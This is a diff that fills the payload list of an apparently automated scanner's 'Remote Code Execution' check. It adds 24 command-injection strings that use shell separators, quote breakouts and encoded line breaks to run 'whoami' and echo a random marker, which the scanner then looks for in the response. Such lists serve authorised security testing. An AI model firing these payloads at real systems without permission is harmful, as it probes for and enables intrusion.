@@ -1,4 +1,34 @@
 {
     "description": "Remote Code Execution",
-    "payloads": []
+    "vulnerability": "Command injection",
+    "payloads": [{
+        "payload":[
+            ";whoami; echo [RANDOM_8]",
+            "&whoami; echo [RANDOM_8]",
+            "&&whoami; echo [RANDOM_8]",
+            "||whoami; echo [RANDOM_8]",
+            "|whoami; echo [RANDOM_8]",
+            "$(whoami); echo [RANDOM_8]",
+            "`whoami`; echo [RANDOM_8]",
+            "\"; whoami; echo [RANDOM_8]",
+            "'; whoami; echo [RANDOM_8]",
+            "%0Dwhoami; echo [RANDOM_8]",
+            "\"%0Dwhoami; echo [RANDOM_8]",
+            "'%0Dwhoami; echo [RANDOM_8]",
+            "%0Awhoami; echo [RANDOM_8]",
+            "\"%0Awhoami; echo [RANDOM_8]",
+            "'%0Awhoami; echo [RANDOM_8]",
+            "%0D%0Awhoami; echo [RANDOM_8]",
+            "\"%0D%0Awhoami; echo [RANDOM_8]",
+            "'%0D%0Awhoami; echo [RANDOM_8]",
+            "\"&&whoami; echo [RANDOM_8]",
+            "\"||whoami; echo [RANDOM_8]",
+            "\"|whoami; echo [RANDOM_8]",
+            "'&&whoami; echo [RANDOM_8]",
+            "'||whoami; echo [RANDOM_8]",
+            "'|whoami; echo [RANDOM_8]"
+        ],
+        "verify":["[RANDOM_8]"],
+        "type": "REGEX"
+    }]
 }
